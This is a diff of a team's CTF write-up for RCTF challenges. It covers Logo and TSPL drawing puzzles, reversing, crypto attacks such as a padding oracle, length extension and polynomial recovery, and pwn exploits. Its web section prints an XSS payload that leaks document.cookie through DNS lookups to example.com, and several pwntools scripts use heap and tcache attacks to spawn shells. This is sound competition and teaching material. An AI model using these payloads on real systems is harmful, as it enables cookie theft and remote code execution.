@@ -33,8 +33,10 @@
 ## MISC
 ### draw
 
+
 ```
 cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home
+
 ```
 
 use `https://www.calormen.com/jslogo/` then you can get the flag easily.
@@ -45,6 +47,7 @@ use `https://www.calormen.com/jslogo/` then you can get the flag easily.
     - [https://www.tscprinters.com/EN/DownloadFile/DownloadFileSupport/1010/TSPL\_TSPL2\_Programming.pdf?m\_id=4356&ReturnUrl=support%2Fsupport\_download%2FTDP-225%20Series](https://www.tscprinters.com/EN/DownloadFile/DownloadFileSupport/1010/TSPL_TSPL2_Programming.pdf?m_id=4356&ReturnUrl=support%2Fsupport_download%2FTDP-225%20Series)
 
 - there's two parts in the flag
+
 ```
 BAR 348, 439, 2, 96
 BAR 292, 535, 56, 2
@@ -97,22 +100,27 @@ BAR 168, 351, 16, 2
 BAR 168, 311, 2, 40
 BAR 152, 351, 16, 2
 BAR 152, 351, 2, 16
+
 ```
 - draw this first with canvus you'll get flag part 1.
 ![](https://i.imgur.com/A0nxNIG.png)
 
 - Flag part2 are two bitmap pictures
 
+
 ```
 BITMAP 138,75,26,48,1
 
 ffffffffffffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffffffffffffffc3ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffe3fffe1ffffffffff807c03c603fc07c07e0007f7ff01f8067ff007ff803fc07c03fff1ff1f04f8ff1ff1fff1fff3ffcff1f27fc7f1ff3e1ff1ff9ffff1ff1fc1fcff8ff1fff1fff3ffefe3f87f8ff9feff8ff1ff9ffff8ff1fc3fc7fcff1fff1fff1ffefc7fc7f9ff8fdffc7f1ff9ffff8ff1fc7fe3fc7f1fff1fff1ffefcffe7f1ff8f9ffc3f1ff9ffffc7f1fc7fe3fe3f1fff1fff0ffef8ffe7f1ff0fbffe3f1ff9ffffc7f1fc7fe3fe3f1fff1fff0ffef8ffe7e1ff8f3ffe3f1ff9ffffe3f1fc7fe3ff1f1fff1fff47fef8ffe7e3ff9f7ffe1f1ff9ffffe3f1fc7ff3ff8e1fff1fff47fef9ffe7e3ffffffff1f1ff9fffff1f1fc7ff3ff8c1fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1fc7ff3ffc11fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1fc7fe3ffe31fff1fff71fef9ffe7f1ffffffff1f1ff9fffff8f1fc7fe3ffe71fff1fff71fef8ffe7f8ffffffff0f1ff9fffff8f1fc7fe3ffcf1fff1fff78fef8ffe7fcffffffff0f1ff9fffffc61fc7fe7ff9f1fff1fff78fef8ffc7fe3fffffff0f1ff9fffffc41fc7fc7ff3f1fff1fff7c7efcffc7ff83ffffff0f9ff1fffffe11fc3f8fff7f1fff1fff7c7efc7fa7ff87ffffff0f9fe9fffffe31fc1f1ffe7f1fff1fff7e3efe3e67fe3fffffff1f8f99ffffff31fc403fe01f1fff1fff7e3eff80e0fc7fffffff1fc039fffffe71fc79ffffff1fff1fff7f1efff3eff8ffffffff1ff0f9fffffef1fc7fffffff1fff1fff7f0efffffff8ffffffff1ffff9fffffcf1fc7fffffff1fff1fff7f8efffffff8fffffffe1ffff9fffff9f1fc7fffffff1fff1fff7f86fffffff8ff9f7ffe3ffff9fffffbf1fc7fffffff1fff1fff7fc6fffffff8ff0f3ffe3ffff9fffff7f1fc7fffffff1fff1fff7fc2fffffff8ff8fbffc7ffff9ffffe7f1fc7fffffff1fff1fff7fe2fffffff8ff8f9ffc7ffff9ffffcff1fc7fffffff1fff1fff7ff0fffffffcff9f9ff8fffff9ffff8ff1fc7fffffff1fff1fff7ff0fffffffc7f9f8ff1fffff9ffff0ff0fc3fffffff1fff0ffe7ff8fffffffe1e7f83e3fffff8fffc03c03c0fffffff03e000780ff83fffffff80fff80ffffff83ffffffffdffffffff3ffffffffffffffffffffffffffffffffbffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+
 ```
+
 
 ```
 BITMAP 130,579,29,32,1
 
 ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc7fffffffffffffffffffffffffffffffffffffffffffffffffffffffe38fffffffffffffffffffffffffffffffffffffffffffffffffffffffdff7ffffffffffffffffffffffffffffffffffffffffffffffffffffff9ff3ffffffffffffffffffffffffffffffffffffffffffffffffffffff9ff3fffffffffffff9ffefbffc7ffffffe1fff8fffffffc3ffffffffff9ff3ff8ffffffffff0ffefbff39ff007f9c7fe72ffffff3c3fc07fffff87e78463f803ff01f0ffe7bfefefff7ff3f3f9f8fffffeff3ffbffffffc01fa3f9ffbfffe7f9ffe71fcfe7ff7ff7f9f9fcfffffeffbffbfffffffc07e7f9ffbfffe7ffffc71f9ff3ff7feff9f3fcfffffeffbffbffffffffe7e7f8ffbfffe7ffffd75f9ff3ff7ffffcf3fcfffffe7ffffbffffffffe7e7f9ffbfffe7ffffd35f9ff3ff7ffffcf3fcfffffe3ffffbfffffff80fe7f9ffbfffe7ffffd2cf9ff3ff7ffffcf3fcffffff07fffbfffffff7cfe7f3ffbfffe7ffffb2cf9ff3ff7fe000f3fcffffffc1fffbffffffe7e7e7c7ffbfffe7ffffbacf9ff3ff7fe7fcf3fcfffffff87ffbffffffe7e7e03fffbfffe7ffffb9ef9ff3ff7fe7fcf3fcfffffffe7ffbffffffefe7e7ffffbfffe7ffffb9e79ff3ff7fe7f9f3fcfffffeff3ffbffffffefe7e7f9ffbfffe7ffff79e7cfe7ff7ff3f9f9f8fffffeff3ffbffffffe7e7f7f1ffbfffe7f1ff79e7efcfff7ff3f3f9f0fffffe7f7ffbffffff27eff3f3ffbfffe7f0fe38e3f39fff7ffce7fc04fffffe1cfff9ffffff019ff9e7ffbfffe7f1fffffffc7fff7fff1fffbcfffffee3fff87fffffbe7ffe1fffbffe00ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfe7e7ffffffffffffff7ffffffffcfffffffffff3ffffffffffffffffbfe7efffffffffffffff7ffffffffcfffffffffff1ffffffffffffffffbfe7cfffffffffffffff03fffffffc3ffffffffff1ffffffffffffffff81f03fffffffffffffff3ffffffffcfffffffffffbffffffffffffffff9ffffff
+
 ```
 
 - convert the hex data to binary data then you'll get the flag part 2.
@@ -126,6 +134,7 @@ ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
 ### babyre1
 * Our input will do some magic operation to become `Bingo!` if it matches the correct input
 * Reverse from `Bingo!` to flag
+
 ```c=
 #include <dlfcn.h>
 #include <string.h>
@@ -165,12 +174,14 @@ int main(int argc,char** argv){
 	puts("");
 
 }
+
 ```
 ### babyre2
 
 * First, it uses xxtea to encrypt a string with your account as the key.
 * Then, it uses your password and data to create another key. And decrypt the encrypted string with the second key.
 * The following code is the pseudo-code to generate the second key.
+
 
 ```python=
 def second_key(data,password):
@@ -179,8 +190,10 @@ def second_key(data,password):
   for i in password:
     key+=chr(ord(i)-(ord(i)/10)-(ord(i)%10))^0xcc
   return key
+
 ```
 * When the two keys are identical, you can get flag.
+
 
 
 
@@ -198,6 +211,7 @@ r.shutdown("send")
 
 r.interactive()
 #rctf{f8b1644ac14529df029ac52b7b762493}
+
 ```
 
 ### asm
@@ -206,6 +220,7 @@ r.interactive()
 * Use `riscv64-unknown-linux-gnu-objdump` to extract riscv assembly code.
 * There are two loops in main function. The first one encodes your input flag. And the second one compares yout input with encoded flag.
 * The following is the pseudo-code of first loop.
+
 ```python=
 def first_loop(input):
   encoded_input=""
@@ -225,9 +240,11 @@ def first_loop(input):
     a4-=a5
     encoded_input+=t1^a4
   return encoded_input
+
 ```
 
 * Once you know that the first byte is `R`, you can easily construct the flag.
+
 
 
 ```python=
@@ -252,12 +269,14 @@ for i in range(len(ii)-1):
   flag+=fff
   print flag
   #RCTF{f5_is_not_real_reversing_}
+
 ```
 
 ### DontEatMe
 
 * First, it will generate a maze. and you have to go to the destination.
 * Use ollydbg, you can easily get the maze.
+
 ```
 00 [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
 01 [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1]
@@ -278,6 +297,7 @@ for i in range(len(ii)-1):
 S: starting point 
 D: destination
 1: Wall
+
 ```
 
 * Then you should give a movement sequence that leads to the destination. And the length of the sequence should be 16.
@@ -292,6 +312,7 @@ D: destination
 
 In the challenge, our objective is to steal the cookie. The website contains a XSS page that we can inject any HTML. Also we can send a link to admin. However the CSP is very strict:
 
+
 ```
 sandbox allow-scripts allow-same-origin;
 base-uri none;
@@ -302,9 +323,11 @@ object-src none;
 frame-src none;
 font-src data: self;
 style-src unsafe-inline self;
+
 ```
 
 The challenge is about how to exfiltrate the cookie in such strict CSP. What's worse, the XSS payload will be prepend some js to prevent `document.location` redirection.
+
 
 ```htmlmixed
 <script>
@@ -313,9 +336,11 @@ window.addEventListener("beforeunload", function (event) {
   return "Are you sure want to exit?"
 })
 Object.freeze(document.location) </script>
+
 ```
 
 When trying to bypass `document.location` limitation, we found remote will send a DNS request and open a TCP connection (but not sending HTTP request). Thus it comes to us that maybe we can use DNS request to steal the cookie.
+
 
 ```htmlmixed
 <script>
@@ -324,6 +349,7 @@ for (let k of document.cookie)
   c+=(k.charCodeAt(0).toString(16))                                                                             
 window.location.assign("http://" + c.substring(0, 60) + "." + c.substring(60, 120) + "."+ c.substring(120, 180) + ".example.com/");
 </script>
+
 ```
 
 I think it abuses remote browser's prefetching mechanism. The remote browser will only resolve the DNS address and open a TCP connection to `...example.com`, but it will not send any HTTP request. The bahavior is a little bit strange, isn't it?
@@ -335,6 +361,7 @@ You can refer to the official writeup [here](https://github.com/zsxsoft/my-ctf-c
 ### f(x)
 In this task, we have evaluation result of a unknown polynomial on 0x200 random points over a unknown finite field.
 
+
 ```
 K = [FLAG] + [rand(Nbits) for i in range(0xff)]
 M = prime(Nbits)
@@ -344,6 +371,7 @@ def f(x):
 
 for i in range(0x200):
     print "f(%d) = %d" % f(rand(Nbits))
+
 ```
 
 The challenging part is that we don't know what `M` is.
@@ -351,6 +379,7 @@ To recover `M`, we use the fact that lagrange polynomial is the lowest degree po
 The coefficients of monomials with degree larger than 0x100 will be zero (i.e. multiple of `M`).
 Calculate all the coefficients of 0 ~ 0x200 degree's monomials need too much resources.
 We calculate the coefficients of 0x101 degree's monomials on random subset of points instead.
+
 
 ```
 # sagemath
@@ -382,10 +411,12 @@ pool = mp.Pool(24)
 result = []
 for n in pool.imap_unordered(worker, range(24)):
     result.append(n)
+
 ```
 
 After we have 24 numbers which should be multiple of `M`, we calculate gcd of them, and factor it using `yafu`.
 Once we have `M`, just build a Vandermonde matrix and solve it.
+
 
 ```
 # sagemath
@@ -404,6 +435,7 @@ M = Matrix.vandermonde(x)
 print('Solving equations - this step takes several minutes')
 z = M.solve_right(y)
 print(repr(libnum.n2s(int(z[0]))))
+
 ```
 
 ### baby_aes
@@ -412,8 +444,10 @@ The goal is to implement a decrypt routine for it.
 
 The inverse of Sbox is easy. Just build a inverse lookup dictionary.
 
+
 ```
 S_inv = {e: i for i, e in enumerate(S)}
+
 ```
 
 For the Tbox, it gets more tricky.
@@ -426,6 +460,7 @@ Here's some properties we can found in these Tboxes:
 All these properties are true for the tbox in this task.
 Now, we know that `c(x)` is [8, 9, 7, 5].
 To build the inverse of Tbox, we use sage to calculate the inverse over `x^4 + 1`.
+
 
 ```
 import pickle
@@ -450,6 +485,7 @@ T_inv = [[ toint32(c_inv * (F(ZZ(i).bits()) * u^p)) for i in range(256)] for p i
 
 with open('inv.pkl', 'wb') as f:
     pickle.dump(T_inv, f)
+
 ```
 
 We have all the inverse we need, undo each step of AES and decrypt the flag.
@@ -463,6 +499,7 @@ It will then provide us the iv, ciphertext and `sha1(key | plaintext)`. Later we
 
 1. we can apply the padding oracle attack to decrypt arbitary ciphertext.
 2. we can construct correct ciphertext for arbitary plaintext since iv is controllable and that we can do arbitary decrypt.
+
 
 ```python=
 
@@ -497,10 +534,12 @@ def decrypt(enc):
                 print (ans)
                 break
     return ans
+
 ```
 #### Length extension attack
 Now, what plaintext do we want?
 Let's see what the challenge do if we pass both padding check and hash check
+
 
 ```python=
 
@@ -513,6 +552,7 @@ if info[b"admin"] == b"1":
     with open("flag") as f:
         flag = f.read()
         print("Your flag: %s" %flag)
+
 ```
 
 so if we construct a plaintext like this:
@@ -529,6 +569,7 @@ This is a challenge about [ECC](https://en.wikipedia.org/wiki/Elliptic-curve_cry
 The equation is $\begin{equation} E: y^2 = x^3 + ax + b \end{equation}$ in $GF(m)$, where $m$ is a prime number.
 It will first generate two point `P, Q` on $E$ and a random number `s`, then : 
 
+
 ```python=
 
 # P = (x1, y1)
@@ -541,6 +582,7 @@ for i in range(10):
     # r = (s*Q)[0]
     r = mul(s, Q, A, B, M)[0]
     print("r%d: %d" % (i, r))
+
 ```
 
 Our job is to guess `r10` to get flag. We know everything except initial `s` 
@@ -562,6 +604,7 @@ P.S. I believe there should be much much better solution to this chal, yet the b
 * Open, read and write get flag.
 
 `rctf{15172bc66a5f317986cb8293597e033c}`
+
 ```python
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
@@ -695,6 +738,7 @@ if __name__ == '__main__':
   add(0x100)
 
   r.interactive()
+
 ```
 
 ### ManyNotes
@@ -707,6 +751,7 @@ if __name__ == '__main__':
 
 I got the shell on local but the remote failed. 
 Billy used my expolit remote to succeed. WTFFFFFFFFFFFFF?????????????
+
 
 
 ```
@@ -730,8 +775,10 @@ Billy used my expolit remote to succeed. WTFFFFFFFFFFFFF?????????????
 0x7fa7280008c0: 0x0000000000000000      0x0000000000010000
 0x7fa7280008d0: 0x0000000000000000      0x0000000000000000
 0x7fa7280008e0: 0x0000000000000000      0x0000000000000000
+
 ```
 `RCTF{House_of_0range_in_Thread}`
+
 
 ```python
 #!/usr/bin/env python
@@ -800,12 +847,14 @@ if __name__ == '__main__':
   r.sendline("1")
   r.interactive()
 
+
 ```
 
 ### shellcoder
 * 7 arbitrary bytes(expect null byte) to read larger shellcode
 * sys_memfd_create to create a memfd and write a whole static link elf binary to fd
 * stub_execveat to exec from fd to search directory and print flag
+
 
 
 ```python
@@ -866,8 +915,10 @@ r.shutdown("send")
 
 r.interactive()
 
+
 ```
 * find_flag source code
+
 ```c=
 #include <dirent.h>
 #include <errno.h>
@@ -906,6 +957,7 @@ int main() {
         listdir("flag");
 }
 
+
 ```
 ### syscall_interface
 * sys_personality set flag READ_IMPLIES_EXEC on
@@ -913,6 +965,7 @@ int main() {
 * leave some shellcode on heap by printf
 * update username and sys_rt_sigreturn to let me control RIP
 * Read more shellcode and get shell
+
 ```python
 from pwn import *
 context.arch = 'amd64'
@@ -958,6 +1011,7 @@ r.send("\x90"*0x50+asm("add rsp,0x500")+asm(shellcraft.sh()))
 
 r.interactive()
 
+
 ```
 ### chat
 * Leave some heap layout on bss for later free
@@ -966,6 +1020,7 @@ r.interactive()
 * double free bss by modify name
 * Tcache Attack to modify strstr got entry to system
 * Get shell
+
 
 ```python
 from pwn import *
@@ -1020,5 +1075,6 @@ r.send("say "+p64(libc+0x4f440)[:-1])
 time.sleep(0.1)
 r.send("/bin/sh\x00")
 r.interactive()
+
 
 ```
